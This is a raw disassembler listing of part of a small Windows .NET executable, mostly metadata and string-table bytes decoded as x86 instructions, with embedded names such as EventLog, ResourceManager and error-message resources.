  4026c9:	add    esp,esp
  4026cb:	add    DWORD PTR [esi],eax
  4026cd:	add    BYTE PTR [esi],dh
  4026cf:	add    dl,BYTE PTR [edi]
  4026d1:	add    al,BYTE PTR [esi]
  4026d3:	add    BYTE PTR [edx+0x2],cl
  4026d6:	add    BYTE PTR gs:[esi],al
  4026d9:	add    BYTE PTR [edx+0x2],dh
  4026dc:	pusha  
  4026dd:	add    al,BYTE PTR [esi]
  4026df:	add    BYTE PTR [ecx+0x6026002],cl
  4026e5:	add    BYTE PTR [esi+0x6026002],ah
  4026eb:	add    ah,al
  4026ed:	add    ah,BYTE PTR [eax+0x2]
  4026f0:	push   es
  4026f1:	add    ch,bl
  4026f3:	add    ah,BYTE PTR [eax+0x2]
  4026f6:	push   es
  4026f7:	add    dh,dh
  4026f9:	add    ah,BYTE PTR [eax+0x2]
  4026fc:	push   es
  4026fd:	add    BYTE PTR [ecx],dl
  4026ff:	add    esp,DWORD PTR [eax+0x2]
  402702:	push   es
  402703:	add    BYTE PTR [edx],ch
  402705:	add    esp,DWORD PTR [eax+0x2]
  402708:	push   es
  402709:	add    BYTE PTR [edi+0x3],al
  40270c:	pusha  
  40270d:	add    al,BYTE PTR [esi]
  40270f:	add    BYTE PTR [ebp+0x3],ch
  402712:	test   al,0x0
  402714:	push   es
  402715:	add    BYTE PTR [edi+0x600a803],cl
  40271b:	add    BYTE PTR [ecx+0x6026003],dh
  402721:	add    ah,cl
  402723:	add    esp,DWORD PTR [eax+0x2]
  402726:	push   es
  402727:	add    ch,ah
  402729:	add    esp,DWORD PTR [eax+0x2]
  40272c:	push   es
  40272d:	add    BYTE PTR [ebx],ah
  40272f:	add    al,0x3
  402731:	add    al,0x6
  402733:	add    BYTE PTR [ecx+0x4],al
  402736:	jae    0x402738
  402738:	pop    edi
  402739:	add    BYTE PTR [ebp+0x4],dl
  40273c:	add    BYTE PTR [eax],al
  40273e:	push   es
  40273f:	add    BYTE PTR [esp+eax*1+0x3],ah
  402743:	add    al,0x6
  402745:	add    BYTE PTR [edi+0xa006504],cl
  40274b:	add    dl,cl
  40274d:	add    al,0xab
  40274f:	add    al,0xa
  402751:	add    al,dl
  402753:	add    al,0xab
  402755:	add    al,0xa
  402757:	add    dh,dl
  402759:	add    al,0xab
  40275b:	add    al,0xa
  40275d:	add    al,ch
  40275f:	add    al,0xab
  402761:	add    al,0xa
  402763:	add    BYTE PTR [esi],dl
  402765:	add    eax,0x604ab
  40276a:	sub    BYTE PTR ds:0x60065,al
  402770:	sub    eax,0xe006505
  402775:	add    BYTE PTR [ecx+0xe056805],dl
  40277b:	add    BYTE PTR [ebp+eax*1+0x120568],ah
  402782:	sub    eax,DWORD PTR [esi]
  402784:	add    DWORD PTR [esi],eax
  402786:	or     al,BYTE PTR [eax]
  402788:	push   ebp
  402789:	push   es
  40278a:	jae    0x40278c
  40278c:	adc    al,BYTE PTR [eax]
  40278e:	outs   dx,DWORD PTR ds:[esi]
  40278f:	push   es
  402790:	add    DWORD PTR [esi],eax
  402792:	push   ss
  402793:	add    BYTE PTR [ebp+0x6],dl
  402796:	jae    0x402798
  402798:	sbb    al,BYTE PTR [eax]
  40279a:	mov    ecx,0xe069906
  40279f:	add    ch,al
  4027a1:	push   es
  4027a2:	push   0xfe001205
  4027a7:	push   es
  4027a8:	add    DWORD PTR [esi],eax
  4027aa:	adc    al,BYTE PTR [eax]
  4027ac:	inc    eax
  4027ad:	pop    es
  4027ae:	adc    BYTE PTR [edi],al
  4027b0:	push   es
  4027b1:	add    BYTE PTR [ecx+0x7],dh
  4027b4:	pusha  
  4027b5:	pop    es
  4027b6:	push   ds
  4027b7:	add    BYTE PTR [edi+eax*1+0x60],bh
  4027bb:	pop    es
  4027bc:	push   es
  4027bd:	add    BYTE PTR [edi+eax*1+0x60065],bh
  4027c4:	fiadd  DWORD PTR [edi]
  4027c6:	add    BYTE PTR gs:[edx],cl
  4027c9:	add    dh,ah
  4027cb:	pop    es
  4027cc:	jae    0x4027ce
  4027ce:	adc    al,BYTE PTR [eax]
  4027d0:	adc    BYTE PTR [eax],cl
  4027d2:	adc    BYTE PTR [edi],al
  4027d4:	or     al,BYTE PTR [eax]
  4027d6:	sub    DWORD PTR [eax],ecx
  4027d8:	jae    0x4027da
  4027da:	push   es
  4027db:	add    BYTE PTR [esi+0x8],dl
  4027de:	inc    esi
  4027df:	or     BYTE PTR [edx],cl
  4027e1:	add    BYTE PTR [eax+0x6086808],al
  4027e7:	add    BYTE PTR [edi+0x6007308],dl
  4027ed:	add    BYTE PTR [eax+ecx*1+0x60403],dh
  4027f4:	fisttp WORD PTR [eax]
  4027f6:	add    BYTE PTR gs:[esi],al
  4027f9:	add    ah,ah
  4027fb:	or     BYTE PTR [ebp+0x0],ah
  4027fe:	push   es
  4027ff:	add    BYTE PTR [eax],cl
  402801:	or     DWORD PTR [eax+0x2],esp
  402804:	or     al,BYTE PTR [eax]
  402806:	or     DWORD PTR ds:[eax],ebp
  402809:	or     DWORD PTR [edx],ecx
  40280b:	add    BYTE PTR [edi+0x9],dl
  40280e:	sub    BYTE PTR [ecx],cl
  402810:	add    BYTE PTR [eax],al
  402812:	add    BYTE PTR [eax],al
  402814:	add    DWORD PTR [eax],eax
  402816:	add    BYTE PTR [eax],al
  402818:	add    BYTE PTR [eax],al
  40281a:	add    DWORD PTR [eax],eax
  40281c:	add    DWORD PTR [eax],eax
  40281e:	add    BYTE PTR [ecx],0x10
  402821:	add    BYTE PTR [ebx],bl
  402823:	add    BYTE PTR [eax],ch
  402825:	add    BYTE PTR ds:0x1000100,al
  40282b:	add    BYTE PTR [eax],al
  40282d:	add    BYTE PTR [eax],dl
  40282f:	add    BYTE PTR [edx+0x0],dl
  402832:	sub    BYTE PTR [eax],al
  402834:	add    eax,0x3000200
  402839:	add    BYTE PTR [ecx],dl
  40283b:	add    BYTE PTR [edi+0x11000a00],cl
  402841:	add    cl,cl
  402843:	add    BYTE PTR [edi],dl
  402845:	add    BYTE PTR [ecx],dl
  402847:	add    dh,dh
  402849:	add    BYTE PTR [ebx],bl
  40284b:	add    BYTE PTR [eax+0x21],dl
  40284e:	add    BYTE PTR [eax],al
  402850:	add    BYTE PTR [eax],al
  402852:	xchg   ecx,eax
  402853:	add    BYTE PTR [edx+0x1000e00],bl
  402859:	add    ah,dh
  40285b:	and    al,BYTE PTR [eax]
  40285d:	add    BYTE PTR [eax],al
  40285f:	add    BYTE PTR [ecx+0x12009f00],dl
  402865:	add    BYTE PTR [ecx],al
  402867:	add    BYTE PTR [ebx+eiz*1],ah
  40286a:	add    BYTE PTR [eax],al
  40286c:	add    BYTE PTR [eax],al
  40286e:	sbb    DWORD PTR [eax],0x6
  402871:	add    DWORD PTR [edi],ebx
  402873:	add    BYTE PTR [edx],al
  402875:	add    BYTE PTR [ebx+eiz*1],ch
  402878:	add    BYTE PTR [eax],al
  40287a:	add    BYTE PTR [eax],al
  40287c:	xchg   ebx,eax
  40287d:	or     BYTE PTR [ecx+eax*1],cl
  402880:	and    eax,DWORD PTR [eax]
  402882:	add    al,BYTE PTR [eax]
  402884:	imul   esp,DWORD PTR [ebx],0x0
  402887:	add    BYTE PTR [eax],al
  402889:	add    BYTE PTR [ebx+0x28012008],dl
  40288f:	add    BYTE PTR [edx],al
  402891:	add    BYTE PTR [edx+0x23],dh
  402894:	add    BYTE PTR [eax],al
  402896:	add    BYTE PTR [eax],al
  402898:	xchg   ebx,eax
  402899:	or     BYTE PTR [ecx+eax*1],ch
  40289c:	sub    eax,0x7a000200
  4028a1:	and    eax,DWORD PTR [eax]
  4028a3:	add    BYTE PTR [eax],al
  4028a5:	add    BYTE PTR [ebx+0x33013808],dl
  4028ab:	add    BYTE PTR [ebx],al
  4028ad:	add    BYTE PTR [eax+0x23],dl
  4028b3:	add    BYTE PTR [ebx+0x33014c08],dl
  4028b9:	add    BYTE PTR [ebx],al
  4028bb:	add    BYTE PTR [esi+0x23],ah
  4028c1:	add    BYTE PTR [ebx+0x33016408],dl
  4028c7:	add    BYTE PTR [ebx],al
  4028c9:	add    BYTE PTR [ebx+eiz*1+0x0],bh
  4028d0:	xchg   ebx,eax
  4028d1:	or     BYTE PTR [ecx+eax*1+0x33],dh
  4028d5:	add    BYTE PTR [ebx],al
  4028d7:	add    BYTE PTR [eax],al
  4028d9:	add    BYTE PTR [ecx],al
  4028db:	add    al,bl
  4028dd:	add    DWORD PTR [eax],eax
  4028df:	add    BYTE PTR [ecx],al
  4028e1:	add    dh,bl
  4028e3:	add    DWORD PTR [ecx],ebp
  4028e5:	add    BYTE PTR [esi],al
  4028e7:	add    DWORD PTR [ebp+0x0],eax
  4028ea:	xor    DWORD PTR [eax],eax
  4028ec:	push   es
  4028ed:	add    DWORD PTR [edx+0x0],ecx
  4028f0:	cmp    DWORD PTR [eax],eax
  4028f2:	push   es
  4028f3:	add    DWORD PTR [edx+0x0],ecx
  4028f6:	inc    ecx
  4028f7:	add    BYTE PTR [esi],al
  4028f9:	add    DWORD PTR [ebp+0x0],eax
  4028fc:	dec    ecx
  4028fd:	add    BYTE PTR [esi],al
  4028ff:	add    DWORD PTR [ebp+0x0],eax
  402902:	push   ecx
  402903:	add    BYTE PTR [esi],al
  402905:	add    DWORD PTR [ebp+0x0],eax
  402908:	pop    ecx
  402909:	add    BYTE PTR [esi],al
  40290b:	add    DWORD PTR [ebp+0x0],eax
  40290e:	popa   
  40290f:	add    BYTE PTR [esi],al
  402911:	add    DWORD PTR [ebp+0x0],eax
  402914:	imul   eax,DWORD PTR [eax],0x450106
  40291a:	jno    0x40291c
  40291c:	push   es
  40291d:	add    DWORD PTR [ebp+0x0],eax
  402920:	jns    0x402922
  402922:	push   es
  402923:	add    DWORD PTR [ebp+0x0],eax
  402926:	add    DWORD PTR [eax],0x450106
  40292c:	mov    DWORD PTR [eax],eax
  40292e:	push   es
  40292f:	add    DWORD PTR [ebp+0x0],eax
  402932:	xchg   ecx,eax
  402933:	add    BYTE PTR [esi],al
  402935:	add    DWORD PTR [ebp+0x0],eax
  402938:	cdq    
  402939:	add    BYTE PTR [esi],al
  40293b:	add    DWORD PTR [edx+0x0],ecx
  40293e:	mov    eax,ds:0x45010600
  402943:	add    BYTE PTR [ecx+0x4f010600],ch
  402949:	add    BYTE PTR [ecx+0x1f010600],dh
  40294f:	add    BYTE PTR [ecx+0x55010600],bh
  402955:	add    cl,cl
  402957:	add    BYTE PTR [esi],al
  402959:	add    DWORD PTR [ebx+0x0],ebx
  40295c:	adc    DWORD PTR [eax],eax
  40295e:	push   es
  40295f:	add    DWORD PTR [edi],ebx
  402961:	add    BYTE PTR [ecx],dl
  402963:	add    BYTE PTR [esp+eax*1+0xd10045],al
  40296a:	fwait
  40296b:	add    al,0x33
  40296d:	add    cl,bl
  40296f:	add    al,dl
  402971:	add    al,0x2
  402973:	add    ecx,ebp
  402975:	add    ah,bl
  402977:	add    al,0x9
  402979:	add    ecx,esp
  40297b:	add    al,bh
  40297d:	add    al,0xd
  40297f:	add    ecx,esi
  402981:	add    BYTE PTR [ebx],al
  402983:	add    eax,0xf10112
  402988:	or     eax,0xf9011605
  40298d:	add    BYTE PTR [esi],bl
  40298f:	add    eax,0x109011c
  402994:	xor    al,0x5
  402996:	and    BYTE PTR [ecx],al
  402998:	adc    DWORD PTR [ecx],eax
  40299a:	rol    DWORD PTR ds:0x121012f,0x39
  4029a1:	push   es
  4029a2:	xor    eax,0x41011101
  4029a7:	push   es
  4029a8:	cmp    al,0x1
  4029aa:	sub    DWORD PTR [ecx],eax
  4029ac:	pop    ebp
  4029ad:	push   es
  4029ae:	inc    eax
  4029af:	add    DWORD PTR [ecx],esi
  4029b1:	add    DWORD PTR [esi+eax*1+0x46],edi
  4029b5:	add    DWORD PTR [ecx+0x1],eax
  4029b8:	push   es
  4029b9:	add    DWORD PTR [edi],ebx
  4029bb:	add    BYTE PTR [ecx+0x1],cl
  4029be:	iret   
  4029bf:	push   es
  4029c0:	dec    edi
  4029c1:	add    DWORD PTR [ecx+0x1],eax
  4029c4:	out    0x6,al
  4029c6:	push   esp
  4029c7:	add    DWORD PTR [ecx+0x1],edx
  4029ca:	push   es
  4029cb:	add    DWORD PTR [edx+0x1],ebx
  4029ce:	pop    ecx
  4029cf:	add    DWORD PTR [esi],eax
  4029d1:	add    DWORD PTR [edi+0x0],ecx
  4029d4:	pop    ecx
  4029d5:	add    DWORD PTR [edi+eax*1+0x1610161],ecx
  4029dc:	sahf   
  4029dd:	pop    es
  4029de:	add    DWORD PTR [bx+di+0x1],ebx
  4029e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029e3:	pop    es
  4029e4:	pop    ds
  4029e5:	add    BYTE PTR [ecx+0x1],dh
  4029e8:	mov    BYTE PTR [edi],0x1c
  4029eb:	add    DWORD PTR [ecx+0x1],ebx
  4029ee:	rol    BYTE PTR [edi],cl
  4029f0:	pop    ds
  4029f1:	add    BYTE PTR [ecx+0x1],bh
  4029f4:	rol    BYTE PTR [edi],cl
  4029f6:	pop    ds
  4029f7:	add    BYTE PTR [ecx],ch
  4029f9:	add    esp,esi
  4029fb:	pop    es
  4029fc:	outs   dx,DWORD PTR ds:[esi]
  4029fd:	add    DWORD PTR [ecx+0x1c080301],eax
  402a03:	add    DWORD PTR [ecx],edx
  402a05:	add    BYTE PTR [ebx],bh
  402a07:	or     BYTE PTR [edx+0x601a101],bl
  402a0d:	add    DWORD PTR [edi+0x0],ecx
  402a10:	test   eax,0x1f010601
  402a15:	add    BYTE PTR [ecx+0x1f010601],dh
  402a1b:	add    BYTE PTR [ecx],cl
  402a1d:	add    BYTE PTR [esi],al
  402a1f:	add    DWORD PTR [edi],ebx
  402a21:	add    BYTE PTR [ecx],cl
  402a23:	add    bh,cl
  402a25:	or     al,ch
  402a27:	add    DWORD PTR [ecx-0x11f709ff],edi
  402a2d:	add    DWORD PTR [ecx-0x8f6eeff],edi
  402a33:	add    DWORD PTR [ecx],ebx
  402a35:	add    BYTE PTR [esi],al
  402a37:	add    ebp,edi
  402a39:	add    DWORD PTR [ecx],ebx
  402a3b:	add    BYTE PTR [esi],bl
  402a3d:	or     DWORD PTR [edx],ecx
  402a3f:	add    dl,cl
  402a41:	add    DWORD PTR [esi],eax
  402a43:	add    DWORD PTR [ecx],edx
  402a45:	add    ch,BYTE PTR [ecx]
  402a47:	add    bl,bl
  402a49:	add    DWORD PTR [eax],ebx
  402a4b:	add    ch,BYTE PTR [esi]
  402a4d:	add    BYTE PTR [ebx],bh
  402a4f:	add    BYTE PTR [ebx+0x2],bh
  402a52:	add    BYTE PTR cs:[ebx+0x0],al
  402a56:	xchg   esi,eax
  402a57:	add    ch,BYTE PTR [esi]
  402a59:	add    BYTE PTR [ebx+0x0],cl
  402a5c:	mov    esp,0xa3002e02
  402a61:	add    BYTE PTR [edi+0xb002e06],ch
  402a67:	add    BYTE PTR [ecx],ah
  402a69:	add    ch,BYTE PTR [esi]
  402a6b:	add    BYTE PTR [ebx],dl
  402a6d:	add    BYTE PTR [ecx+0x2],bl
  402a70:	add    BYTE PTR cs:[ebx],bl
  402a73:	add    BYTE PTR [edi+0x2],bl
  402a76:	add    BYTE PTR cs:[ebx],ah
  402a79:	add    BYTE PTR [ebp+0x2],ah
  402a7c:	add    BYTE PTR cs:[ebx],ch
  402a7f:	add    BYTE PTR [ebp+0x2],ah
  402a82:	add    BYTE PTR cs:[ebx],dh
  402a85:	add    BYTE PTR [ebp+0x2],ah
  402a88:	add    BYTE PTR cs:[ebx+0x0],dh
  402a8c:	adc    BYTE PTR [ebx],al
  402a8e:	add    BYTE PTR cs:[ebx+0x0],bl
  402a92:	lock add ch,BYTE PTR [esi]
  402a95:	add    BYTE PTR [ebx+0x0],ah
  402a98:	lock add ch,BYTE PTR [esi]
  402a9b:	add    BYTE PTR [ebx+0x0],ch
  402a9e:	add    al,BYTE PTR [ebx]
  402aa0:	add    BYTE PTR cs:[ebx+0x2e031b00],al
  402aa7:	add    BYTE PTR [ebx+0x0],bh
  402aaa:	pop    edi
  402aab:	add    ch,BYTE PTR [esi]
  402aad:	add    BYTE PTR [ebx+0x2e034600],cl
  402ab3:	add    BYTE PTR [ebx+0x2e069000],dl
  402ab9:	add    BYTE PTR [ebx+0x49021800],bl
  402abf:	add    bl,bl
  402ac1:	add    DWORD PTR [eax],ebx
  402ac3:	add    ah,BYTE PTR [ebx+0x0]
  402ac6:	fwait
  402ac7:	add    ebx,esp
  402ac9:	add    DWORD PTR [ebx+0x0],esp
  402acc:	mov    ds:0x6301e301,eax
  402ad1:	add    BYTE PTR [ebx+0x7501a201],dl
  402ad7:	add    DWORD PTR [edi+0x3020501],edx
  402add:	add    BYTE PTR [ecx],al
  402adf:	add    BYTE PTR [eax],al
  402ae1:	add    BYTE PTR [ecx+0x3700],bh
  402ae7:	add    BYTE PTR [ecx+eax*1+0x3c],cl
  402aee:	xchg   esp,eax
  402aef:	add    DWORD PTR [ecx+0x0],eax
  402af2:	add    BYTE PTR [eax],al
  402af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402af5:	add    DWORD PTR [ecx+0x0],eax
  402af8:	add    BYTE PTR [eax],al
  402afa:	mov    eax,0x4101
  402aff:	add    ah,al
  402b01:	add    DWORD PTR [ecx+0x0],eax
  402b04:	add    al,BYTE PTR [eax]
  402b06:	add    al,0x0
  402b08:	add    eax,DWORD PTR [eax]
  402b0a:	add    al,BYTE PTR [eax]
  402b0c:	add    eax,0x1000500
  402b11:	add    BYTE PTR [esi],al
  402b13:	add    BYTE PTR ds:0x7000200,al
  402b19:	add    BYTE PTR [edi],al
  402b1b:	add    BYTE PTR [edx],al
  402b1d:	add    BYTE PTR [eax],cl
  402b1f:	add    BYTE PTR [ecx],cl
  402b21:	add    BYTE PTR [edx],al
  402b23:	add    BYTE PTR [ecx],cl
  402b25:	add    BYTE PTR [ebx],cl
  402b27:	add    BYTE PTR [edx],al
  402b29:	add    BYTE PTR [edx],cl
  402b2b:	add    BYTE PTR ds:0x800400,cl
  402b31:	add    BYTE PTR [ebx],cl
  402b33:	add    BYTE PTR [eax],al
  402b35:	add    BYTE PTR [eax],al
  402b37:	add    BYTE PTR [eax],al
  402b39:	add    BYTE PTR [ecx],al
  402b3b:	add    BYTE PTR [eax],al
  402b3d:	add    BYTE PTR [eax+0x0],ah
  402b40:	sbb    eax,DWORD PTR [eax]
  402b42:	add    BYTE PTR [eax],al
  402b44:	add    al,0x0
	...
  402b4e:	add    BYTE PTR [eax],al
  402b50:	add    DWORD PTR [eax],eax
  402b52:	pop    esp
  402b53:	add    BYTE PTR [eax],al
  402b55:	add    BYTE PTR [eax],al
  402b57:	add    BYTE PTR [eax+eax*1],al
	...
  402b62:	add    BYTE PTR [eax],al
  402b64:	add    DWORD PTR [eax],eax
  402b66:	add    BYTE PTR gs:[eax],al
  402b69:	add    BYTE PTR [eax],al
  402b6b:	add    BYTE PTR [ebx],cl
	...
  402b75:	add    BYTE PTR [eax],al
  402b77:	add    BYTE PTR [esi],ah
  402b79:	add    DWORD PTR [ecx],edi
  402b7b:	add    eax,0x0
  402b80:	or     eax,DWORD PTR [eax]
	...
  402b8a:	add    BYTE PTR [eax],al
  402b8c:	es add ebx,esp
  402b8f:	add    eax,0x0
  402b94:	add    al,BYTE PTR [eax]
	...
  402b9e:	add    BYTE PTR [eax],al
  402ba0:	add    DWORD PTR [eax],eax
  402ba2:	add    BYTE PTR gs:[eax],al
  402ba5:	add    BYTE PTR [eax],al
  402ba7:	add    BYTE PTR [ebx],cl
	...
  402bb1:	add    BYTE PTR [eax],al
  402bb3:	add    BYTE PTR [esi],ah
  402bb5:	add    DWORD PTR [ebp+0x6],ecx
  402bbb:	add    BYTE PTR [edx],al
	...
  402bc5:	add    BYTE PTR [eax],al
  402bc7:	add    BYTE PTR [ecx],al
  402bc9:	add    BYTE PTR [eax+eax*1+0x0],bl
  402bcd:	add    BYTE PTR [eax],al
  402bcf:	add    BYTE PTR [eax],al
  402bd1:	add    BYTE PTR [eax],al
  402bd3:	add    BYTE PTR [ecx],al
  402bd5:	add    BYTE PTR [eax],al
  402bd7:	add    BYTE PTR [ecx+ecx*1+0x0],ch
  402bdb:	add    BYTE PTR [eax],al
  402bdd:	add    BYTE PTR [eax],al
  402bdf:	add    BYTE PTR [eax],al
  402be1:	cmp    al,0x4d
  402be3:	outs   dx,DWORD PTR ds:[esi]
  402be4:	fs jne 0x402c53
  402be7:	gs add BYTE PTR ds:[esp+eax*2+0x45],dl
  402bed:	outs   dx,BYTE PTR ds:[esi]
  402bee:	jbe    0x402c33
  402bf0:	ins    BYTE PTR es:[edi],dx
  402bf1:	gs popa 
  402bf3:	outs   dx,BYTE PTR ds:[esi]
  402bf4:	jne    0x402c66
  402bf6:	cs gs js 0x402c5f
  402bfa:	add    BYTE PTR [esp+eax*2+0x45],dl
  402bfe:	outs   dx,BYTE PTR ds:[esi]
  402bff:	jbe    0x402c44
  402c01:	ins    BYTE PTR es:[edi],dx
  402c02:	gs popa 
  402c04:	outs   dx,BYTE PTR ds:[esi]
  402c05:	jne    0x402c77
  402c07:	add    BYTE PTR [ebp+0x69],cl
  402c0a:	arpl   WORD PTR [edx+0x6f],si
  402c0d:	jae    0x402c7e
  402c0f:	data16 je 0x402c40
  402c12:	push   esi
  402c13:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402c1a:	jne    0x402c80
  402c1c:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  402c23:	ins    BYTE PTR es:[edi],dx
  402c24:	ins    BYTE PTR es:[edi],dx
  402c25:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x542e6563
  402c2d:	outs   dx,DWORD PTR ds:[esi]
  402c2e:	outs   dx,DWORD PTR ds:[esi]
  402c2f:	ins    BYTE PTR es:[edi],dx
  402c30:	jae    0x402c32
  402c32:	push   edx
  402c33:	gs jae 0x402ca5
  402c36:	jne    0x402caa
  402c38:	arpl   WORD PTR [ebp+0x73],sp
  402c3b:	add    BYTE PTR [ebp+0x73],ch
  402c3e:	arpl   WORD PTR [edi+0x72],bp
  402c41:	ins    BYTE PTR es:[edi],dx
  402c42:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  402c49:	gs ins DWORD PTR es:[edi],dx
  402c4b:	add    BYTE PTR [edi+0x62],cl
  402c4e:	push   0x65
  402c50:	arpl   WORD PTR [eax+eax*1+0x53],si
  402c54:	jns    0x402cc9
  402c56:	je     0x402cbd
  402c58:	ins    DWORD PTR es:[edi],dx
  402c59:	cs inc esp
  402c5b:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402c62:	imul   esp,DWORD PTR [ebx+0x73],0x65764500
  402c69:	outs   dx,BYTE PTR ds:[esi]
  402c6a:	je     0x402cb8
  402c6c:	outs   dx,DWORD PTR ds:[esi]
  402c6d:	add    BYTE PTR [bp+di+0x5f],dh
  402c71:	gs jbe 0x402cd9
  402c74:	outs   dx,BYTE PTR ds:[esi]
  402c75:	je     0x402cc3
  402c77:	outs   dx,DWORD PTR ds:[esi]
  402c78:	add    BYTE PTR [di+0x61],cl
  402c7c:	imul   ebp,DWORD PTR [esi+0x0],0x45676f4c
  402c83:	jb     0x402cf7
  402c85:	outs   dx,DWORD PTR ds:[esi]
  402c86:	jb     0x402c88
  402c88:	push   ebx
  402c89:	jns    0x402cfe
  402c8b:	je     0x402cf2
  402c8d:	ins    DWORD PTR es:[edi],dx
  402c8e:	cs push edx
  402c90:	gs jae 0x402d02
  402c93:	jne    0x402d07
  402c95:	arpl   WORD PTR [ebp+0x73],sp
  402c98:	add    BYTE PTR [edx+0x65],dl
  402c9b:	jae    0x402d0c
  402c9d:	jne    0x402d11
  402c9f:	arpl   WORD PTR [ebp+0x4d],sp
  402ca2:	popa   
  402ca3:	outs   dx,BYTE PTR ds:[esi]
  402ca4:	popa   
  402ca5:	addr16 gs jb 0x402ca9
  402ca9:	jb     0x402d10
  402cab:	jae    0x402d1c
  402cad:	jne    0x402d21
  402caf:	arpl   WORD PTR [ebp+0x4d],sp
  402cb2:	popa   
  402cb3:	outs   dx,BYTE PTR ds:[esi]
  402cb4:	add    BYTE PTR [ebx+0x79],dl
  402cb7:	jae    0x402d2d
  402cb9:	gs ins DWORD PTR es:[edi],dx
  402cbb:	cs inc edi
  402cbd:	ins    BYTE PTR es:[edi],dx
  402cbe:	outs   dx,DWORD PTR ds:[esi]
  402cbf:	bound  esp,QWORD PTR [ecx+0x6c]
  402cc2:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  402cc9:	add    BYTE PTR [ebx+0x75],al
  402ccc:	ins    BYTE PTR es:[edi],dx
  402ccd:	je     0x402d44
  402ccf:	jb     0x402d36
  402cd1:	dec    ecx
  402cd2:	outs   dx,BYTE PTR ds:[esi]
  402cd3:	outs   dx,WORD PTR ds:[esi]
  402cd5:	add    BYTE PTR [edx+0x65],dh
  402cd8:	jae    0x402d49
  402cda:	jne    0x402d4e
  402cdc:	arpl   WORD PTR [ebp+0x43],sp
  402cdf:	jne    0x402d4d
  402ce1:	je     0x402d58
  402ce3:	jb     0x402d4a
  402ce5:	add    BYTE PTR [esi],ch
  402ce7:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402ceb:	add    BYTE PTR [edi+0x65],ah
  402cee:	je     0x402d4f
  402cf0:	push   edx
  402cf1:	gs jae 0x402d63
  402cf4:	jne    0x402d68
  402cf6:	arpl   WORD PTR [ebp+0x4d],sp
  402cf9:	popa   
  402cfa:	outs   dx,BYTE PTR ds:[esi]
  402cfb:	popa   
  402cfc:	addr16 gs jb 0x402d00
  402d00:	addr16 gs je 0x402d63
  402d04:	inc    ebx
  402d05:	jne    0x402d73
  402d07:	je     0x402d7e
  402d09:	jb     0x402d70
  402d0b:	add    BYTE PTR [ebx+0x65],dh
  402d0e:	je     0x402d6f
  402d10:	inc    ebx
  402d11:	jne    0x402d7f
  402d13:	je     0x402d8a
  402d15:	jb     0x402d7c
  402d17:	add    BYTE PTR [edi+0x65],ah
  402d1a:	je     0x402d7b
  402d1c:	inc    ebp
  402d1d:	jb     0x402d91
  402d1f:	outs   dx,DWORD PTR ds:[esi]
  402d20:	jb     0x402d81
  402d22:	inc    ebp
  402d23:	js     0x402d88
  402d25:	gs jo  0x402d9c
  402d28:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  402d2f:	pop    edi
  402d30:	inc    ebp
  402d31:	jb     0x402da5
  402d33:	outs   dx,DWORD PTR ds:[esi]
  402d34:	jb     0x402d95
  402d36:	dec    ecx
  402d37:	dec    ecx
  402d38:	push   ebx
  402d39:	dec    esi
  402d3a:	outs   dx,DWORD PTR ds:[esi]
  402d3b:	je     0x402d8d
  402d3d:	jb     0x402da4
  402d3f:	jae    0x402da6
  402d41:	outs   dx,BYTE PTR ds:[esi]
  402d42:	je     0x402d44
  402d44:	addr16 gs je 0x402da7
  402d48:	inc    ebp
  402d49:	jb     0x402dbd
  402d4b:	outs   dx,DWORD PTR ds:[esi]
  402d4c:	jb     0x402dad
  402d4e:	push   ebp
  402d4f:	jae    0x402db2
  402d51:	add    BYTE PTR gs:[bx+0x65],ah
  402d56:	je     0x402db7
  402d58:	inc    ebp
  402d59:	jbe    0x402dc0
  402d5b:	outs   dx,BYTE PTR ds:[esi]
  402d5c:	je     0x402daa
  402d5e:	outs   dx,DWORD PTR ds:[esi]
  402d5f:	addr16 pop edi
  402d61:	push   ebx
  402d62:	outs   dx,DWORD PTR ds:[esi]
  402d63:	jne    0x402dd7
  402d65:	arpl   WORD PTR [ebp+0x4e],sp
  402d68:	popa   
  402d69:	ins    DWORD PTR es:[edi],dx
  402d6a:	add    BYTE PTR gs:[ebx+0x75],al
  402d6e:	ins    BYTE PTR es:[edi],dx
  402d6f:	je     0x402de6
  402d71:	jb     0x402dd8
  402d73:	add    BYTE PTR [ebp+0x72],al
  402d76:	jb     0x402de7
  402d78:	jb     0x402dd9
  402d7a:	inc    ebp
  402d7b:	js     0x402de0
  402d7d:	gs jo  0x402df4
  402d80:	imul   ebp,DWORD PTR [edi+0x6e],0x72724500
  402d87:	outs   dx,DWORD PTR ds:[esi]
  402d88:	jb     0x402de9
  402d8a:	dec    ecx
  402d8b:	dec    ecx
  402d8c:	push   ebx
  402d8d:	dec    esi
  402d8e:	outs   dx,DWORD PTR ds:[esi]
  402d8f:	je     0x402de1
  402d91:	jb     0x402df8
  402d93:	jae    0x402dfa
  402d95:	outs   dx,BYTE PTR ds:[esi]
  402d96:	je     0x402d98
  402d98:	inc    ebp
  402d99:	jb     0x402e0d
  402d9b:	outs   dx,DWORD PTR ds:[esi]
  402d9c:	jb     0x402dfd
  402d9e:	push   ebp
  402d9f:	jae    0x402e02
  402da1:	add    BYTE PTR gs:[di+0x76],al
  402da6:	outs   dx,BYTE PTR gs:[esi]
  402da8:	je     0x402df6
  402daa:	outs   dx,DWORD PTR ds:[esi]
  402dab:	addr16 pop edi
  402dad:	push   ebx
  402dae:	outs   dx,DWORD PTR ds:[esi]
  402daf:	jne    0x402e23
  402db1:	arpl   WORD PTR [ebp+0x4e],sp
  402db4:	popa   
  402db5:	ins    DWORD PTR es:[edi],dx
  402db6:	add    BYTE PTR gs:[ebp+0x72],ah
  402dba:	jb     0x402e2b
  402dbc:	jb     0x402dbe
  402dbe:	jbe    0x402e21
  402dc0:	ins    BYTE PTR es:[edi],dx
  402dc1:	jne    0x402e28
  402dc3:	add    BYTE PTR [ebx+0x79],dl
  402dc6:	jae    0x402e3c
  402dc8:	gs ins DWORD PTR es:[edi],dx
  402dca:	cs push edx
  402dcc:	jne    0x402e3c
  402dce:	je     0x402e39
  402dd0:	ins    DWORD PTR es:[edi],dx
  402dd1:	gs cs push esi
